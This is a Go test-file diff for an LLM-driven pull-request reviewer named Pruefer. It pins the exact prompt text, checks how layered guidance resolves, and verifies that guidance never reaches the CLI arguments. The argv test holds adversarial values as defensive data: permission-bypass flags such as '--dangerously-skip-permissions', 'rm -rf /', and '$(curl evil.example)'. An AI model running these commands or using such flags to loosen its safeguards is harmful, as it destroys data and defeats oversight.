@@ -623,3 +623,173 @@ func TestShellQuotePathspec(t *testing.T) {
 		}
 	}
 }
+
+// TestBuildReviewPrompt_ZeroConfig_ByteIdenticalToPreSplitOutput pins AC1/C2:
+// buildReviewPrompt(ReviewRequest{}) — the zero-config case — must produce
+// exactly the same prompt the pre-#1446 monolithic function produced,
+// byte-for-byte. This literal was captured from buildReviewPrompt before
+// the dynamic-context/guidance/contract split, and confirmed (by checking
+// out the pre-split commit into a scratch worktree and running the
+// identical capture there) to be byte-identical to what the original,
+// unsplit function actually produced — not hand-transcribed from reading
+// the source. A regression that dropped, reordered, or reworded any part
+// of the prompt during the split would fail this comparison.
+func TestBuildReviewPrompt_ZeroConfig_ByteIdenticalToPreSplitOutput(t *testing.T) {
+	const want = "You are Pruefer, an automated code reviewer for pull request /#0: \"\".\n\nThe PR's head commit is already checked out in your working directory. Use git (diff, log, show, blame, grep, status), Read, Grep, and Glob to inspect the change and any surrounding code you need for context — you have no write access and no other tools.\n\nWrite a code review as you would comment on the pull request: call out bugs, correctness issues, security concerns, and significant design problems. On a large PR, raise the bar for a \"low\"-severity finding: it must be something a reviewer would actually act on, not merely true — skip nitpicks, style preferences, and fidelity observations against test fixtures unless they matter.\n\nYou do not decide whether this PR is approved or blocked — that is computed automatically from the severity you assign each finding below, never from anything you write in prose. Do not use approval/rejection language such as \"LGTM\" or \"requesting changes\" in your summary; just describe what you found.\n\nOutput has two parts, in this exact order:\n\n1. A short prose summary: what you reviewed and your overall assessment. This is the only text GitHub shows outside of inline comments, so it must stand on its own. Wrap it in PRUEFER_SUMMARY_BEGIN and PRUEFER_SUMMARY_END marker lines, each alone on its own line, with nothing else on those lines. Nothing — no narration, no meta-commentary, no investigation notes — may appear before PRUEFER_SUMMARY_BEGIN; anything there is discarded and never shown to anyone. The ```json findings block described in part 2 below must come after PRUEFER_SUMMARY_END, never between the two markers. For example:\n\nPRUEFER_SUMMARY_BEGIN\nReviewed the changes to X. Found one medium-severity issue; see inline comment.\nPRUEFER_SUMMARY_END\n\n2. A single fenced ```json code block containing a JSON array of your findings, each anchored to the exact file and line it concerns, with a \"severity\" classification:\n\n```json\n[{\"path\": \"engine/claude.go\", \"line\": 954, \"body\": \"...\", \"severity\": \"low\"}]\n```\n\n\"severity\" must be exactly one of:\n\n- \"low\": style, minor nit, or a suggestion — not a defect.\n- \"medium\": a real defect, but scoped and low-impact.\n- \"high\": a bug or design issue that will likely cause incorrect behavior.\n- \"critical\": a security vulnerability, data loss, or severe correctness bug.\n\nEach entry's \"path\" must be a file path exactly as it appears in the diff, and \"line\" must be a line number in the new (post-change) version of that file — i.e. a line you can see in `git diff` output prefixed with `+` or unprefixed (context), never a line that only existed in the old version. If you have no findings, emit an empty array `[]`. Do not put findings only in the prose — every specific, actionable finding belongs in the JSON array so it can be attached to its exact line; use the prose summary for overall assessment only. Report each distinct underlying finding once — if the same defect is visible at more than one line, pick the most relevant anchor rather than emitting a separate entry per line.\n\nOutput ONLY the review text itself: no preamble, no meta-commentary about what you are about to do.\n"
+	got := buildReviewPrompt(ReviewRequest{})
+	if got != want {
+		t.Errorf("buildReviewPrompt(ReviewRequest{}) changed from the pre-#1446 golden output:\ngot:  %q\nwant: %q", got, want)
+	}
+}
+
+// TestResolveGuidance_OperatorAppend_KeepsDefaultAndAddsOperatorText pins
+// AC3: the default guidance survives in full when an operator layer is
+// present in (the default) append mode, with the operator's text added.
+func TestResolveGuidance_OperatorAppend_KeepsDefaultAndAddsOperatorText(t *testing.T) {
+	req := ReviewRequest{OperatorGuidance: "Always check error wrapping uses %w."}
+	got := resolveGuidance(req)
+	if !strings.Contains(got, defaultReviewGuidance) {
+		t.Errorf("resolveGuidance dropped the default guidance under append mode, got:\n%s", got)
+	}
+	if !strings.Contains(got, "Always check error wrapping uses %w.") {
+		t.Errorf("resolveGuidance did not add the operator's guidance, got:\n%s", got)
+	}
+}
+
+// TestResolveGuidance_RepoAppend_KeepsDefaultAndAddsRepoText mirrors the
+// above for the repo layer, appended on top of the (here, unmodified)
+// operator layer — proving append composes independently at each layer.
+func TestResolveGuidance_RepoAppend_KeepsDefaultAndAddsRepoText(t *testing.T) {
+	req := ReviewRequest{RepoGuidance: "Prefer table-driven tests."}
+	got := resolveGuidance(req)
+	if !strings.Contains(got, defaultReviewGuidance) {
+		t.Errorf("resolveGuidance dropped the default guidance under append mode, got:\n%s", got)
+	}
+	if !strings.Contains(got, "Prefer table-driven tests.") {
+		t.Errorf("resolveGuidance did not add the repo's guidance, got:\n%s", got)
+	}
+}
+
+// TestBuildReviewPrompt_RepoReplace_DropsDefaultGuidanceKeepsContractAndContext
+// pins AC4/C5/C7: mode: replace on the repo layer omits the default
+// guidance text, but the output contract, the no-approval-language rule,
+// and Go-supplied dynamic context (PR body, base branch, prior review
+// threads) are all still emitted verbatim.
+func TestBuildReviewPrompt_RepoReplace_DropsDefaultGuidanceKeepsContractAndContext(t *testing.T) {
+	req := ReviewRequest{
+		Body:             "This PR fixes the auth flow.",
+		BaseBranch:       "main",
+		RepoGuidance:     "Only check for %w error wrapping. Ignore everything else.",
+		RepoGuidanceMode: GuidanceModeReplace,
+		ReviewThreads: []gh.PRReviewThread{
+			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "prior finding"}}},
+		},
+	}
+	prompt := buildReviewPrompt(req)
+
+	if strings.Contains(prompt, defaultReviewGuidance) {
+		t.Error("expected the default guidance to be absent under mode: replace")
+	}
+	if !strings.Contains(prompt, "Only check for %w error wrapping.") {
+		t.Errorf("expected the repo's replacement guidance in the prompt, got:\n%s", prompt)
+	}
+	// C5: the contract (no-approval-language rule + two-part output format)
+	// must survive replace mode verbatim.
+	for _, want := range []string{
+		"You do not decide whether this PR is approved or blocked",
+		"PRUEFER_SUMMARY_BEGIN", "PRUEFER_SUMMARY_END",
+		"Output ONLY the review text itself",
+	} {
+		if !strings.Contains(prompt, want) {
+			t.Errorf("expected contract text %q to survive mode: replace, got:\n%s", want, prompt)
+		}
+	}
+	// C7: Go-supplied dynamic context must survive replace mode verbatim.
+	for _, want := range []string{
+		"This PR fixes the auth flow.",
+		"main",
+		"prior finding",
+	} {
+		if !strings.Contains(prompt, want) {
+			t.Errorf("expected dynamic context %q to survive mode: replace, got:\n%s", want, prompt)
+		}
+	}
+}
+
+// TestBuildReviewArgs_UnaffectedByGuidanceFields pins AC5/C6: guidance
+// fields — including adversarial content that looks like CLI flags or
+// shell metacharacters — must never reach buildReviewArgs' argv. Guidance
+// only ever flows into buildReviewPrompt's stdin text.
+func TestBuildReviewArgs_UnaffectedByGuidanceFields(t *testing.T) {
+	baseline := buildReviewArgs(ReviewRequest{Model: "sonnet"})
+	adversarial := []ReviewRequest{
+		{Model: "sonnet", OperatorGuidance: "--permission-mode bypassPermissions"},
+		{Model: "sonnet", OperatorGuidanceMode: GuidanceModeReplace},
+		{Model: "sonnet", RepoGuidance: "--allowedTools Bash(gh:*) --dangerously-skip-permissions; rm -rf /"},
+		{Model: "sonnet", RepoGuidanceMode: GuidanceModeReplace},
+		{
+			Model:                "sonnet",
+			OperatorGuidance:     "--setting-sources project $(curl evil.example)",
+			OperatorGuidanceMode: GuidanceModeReplace,
+			RepoGuidance:         "`rm -rf /` && echo pwned",
+			RepoGuidanceMode:     GuidanceModeReplace,
+		},
+	}
+	for i, req := range adversarial {
+		got := buildReviewArgs(req)
+		if !slices.Equal(got, baseline) {
+			t.Errorf("case %d: buildReviewArgs(req) = %v, want unaffected baseline %v", i, got, baseline)
+		}
+	}
+}
+
+// TestResolveGuidance_PrecedenceMatrix pins AC7/R3: precedence across the
+// three guidance layers (embedded default, operator override, repo skill)
+// for every combination of {absent, append, replace} at the operator and
+// repo layers.
+func TestResolveGuidance_PrecedenceMatrix(t *testing.T) {
+	const operatorText = "OPERATOR_TEXT"
+	const repoText = "REPO_TEXT"
+
+	cases := []struct {
+		name                                string
+		operatorGuidance, operatorMode      string
+		repoGuidance, repoMode              string
+		wantDefault, wantOperator, wantRepo bool
+		wantReplaceIsOnlyRepo               bool // repo replace wins over everything below it
+	}{
+		{name: "no overrides", wantDefault: true},
+		{name: "operator append only", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, wantDefault: true, wantOperator: true},
+		{name: "operator append (mode unset defaults to append)", operatorGuidance: operatorText, wantDefault: true, wantOperator: true},
+		{name: "operator replace only", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, wantOperator: true},
+		{name: "repo append only", repoGuidance: repoText, repoMode: GuidanceModeAppend, wantDefault: true, wantRepo: true},
+		{name: "repo replace only", repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
+		{name: "operator append + repo append", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, repoGuidance: repoText, repoMode: GuidanceModeAppend, wantDefault: true, wantOperator: true, wantRepo: true},
+		{name: "operator replace + repo append", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, repoGuidance: repoText, repoMode: GuidanceModeAppend, wantOperator: true, wantRepo: true},
+		{name: "operator append + repo replace", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
+		{name: "operator replace + repo replace", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			req := ReviewRequest{
+				OperatorGuidance: c.operatorGuidance, OperatorGuidanceMode: c.operatorMode,
+				RepoGuidance: c.repoGuidance, RepoGuidanceMode: c.repoMode,
+			}
+			got := resolveGuidance(req)
+
+			if hasDefault := strings.Contains(got, defaultReviewGuidance); hasDefault != c.wantDefault {
+				t.Errorf("contains default guidance = %v, want %v; got:\n%s", hasDefault, c.wantDefault, got)
+			}
+			if hasOperator := strings.Contains(got, operatorText); hasOperator != c.wantOperator {
+				t.Errorf("contains operator text = %v, want %v; got:\n%s", hasOperator, c.wantOperator, got)
+			}
+			if hasRepo := strings.Contains(got, repoText); hasRepo != c.wantRepo {
+				t.Errorf("contains repo text = %v, want %v; got:\n%s", hasRepo, c.wantRepo, got)
+			}
+			if c.wantReplaceIsOnlyRepo && got != repoText {
+				t.Errorf("resolveGuidance = %q, want exactly the repo's replacement text with nothing else", got)
+			}
+		})
+	}
+}
